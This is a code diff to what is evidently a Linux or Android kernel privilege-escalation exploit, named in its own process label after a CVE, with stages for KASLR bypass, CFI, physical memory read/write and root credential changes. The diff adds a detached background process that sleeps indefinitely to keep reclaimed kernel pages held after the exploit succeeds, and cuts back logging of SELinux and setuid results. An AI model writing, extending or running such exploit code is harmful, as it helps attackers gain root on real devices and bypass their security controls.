@@ -173,6 +173,42 @@ void run_main_route_threads(void) {
   }
 }
 
+static pid_t spawn_allocation_keeper(void) {
+  pid_t child = SYSCHK(fork());
+  if (child != 0) {
+    return child;
+  }
+
+  syscall(SYS_prctl, PR_SET_PDEATHSIG, 0, 0, 0, 0);
+  syscall(SYS_prctl, PR_SET_NAME, "cve43499-hold", 0, 0, 0);
+  syscall(SYS_setsid);
+
+  int null_fd = (int)syscall(
+      SYS_openat, AT_FDCWD, "/dev/null", O_RDWR | O_CLOEXEC, 0);
+  if (null_fd >= 0) {
+    for (int fd = STDIN_FILENO; fd <= STDERR_FILENO; fd++) {
+      if (null_fd != fd) {
+        syscall(SYS_dup3, null_fd, fd, 0);
+      }
+    }
+    if (null_fd > STDERR_FILENO) {
+      syscall(SYS_close, null_fd);
+    }
+  } else {
+    syscall(SYS_close, STDIN_FILENO);
+    syscall(SYS_close, STDOUT_FILENO);
+    syscall(SYS_close, STDERR_FILENO);
+  }
+
+  struct timespec hold = {
+    .tv_sec = 86400,
+    .tv_nsec = 0,
+  };
+  for (;;) {
+    syscall(SYS_nanosleep, &hold, NULL);
+  }
+}
+
 int run_exploit(int argc, char **argv) {
   (void)argc;
   (void)argv;
@@ -203,17 +239,18 @@ int run_exploit(int argc, char **argv) {
              getpid(), atomic_load(&cfi_stage_done), root_child_done,
              kaslr_done, kaslr_base, kaslr_slide);
   pr_success("pipe physrw pid=%d done=%d root=%d kaslr=%d read_ok=%d "
-             "write_ok=%d rw64=%d/%d uid=%u->%u sid=%u/%u->%u/%u "
-             "selinux=%u->%u setgid=%d setuid=%d setenforce=%d/%d\n",
+             "write_ok=%d rw64=%d/%d uid=%u->%u\n",
              getpid(), atomic_load(&cfi_stage_done), root_child_done, kaslr_done,
              physrw_read_ok, physrw_write_ok, physrw_read64_ok, physrw_write64_ok,
-             root_uid_before, root_uid_after, cred_sid_before, real_cred_sid_before,
-             cred_sid_after, real_cred_sid_after, selinux_before, selinux_after,
-             setgid_ret, setuid_ret, setenforce_ret, setenforce_errno);
+             root_uid_before, root_uid_after);
   if (pipe_prepare_child > 0) {
     SYSCHK(kill(pipe_prepare_child, SIGKILL));
     SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
   }
-  sleep(5);
+  if (atomic_load(&cfi_stage_done) && root_child_done) {
+    pid_t keeper = spawn_allocation_keeper();
+    pr_success("stability keeper pid=%d retaining reclaimed kernel pages\n",
+               keeper);
+  }
   return 0;
 }
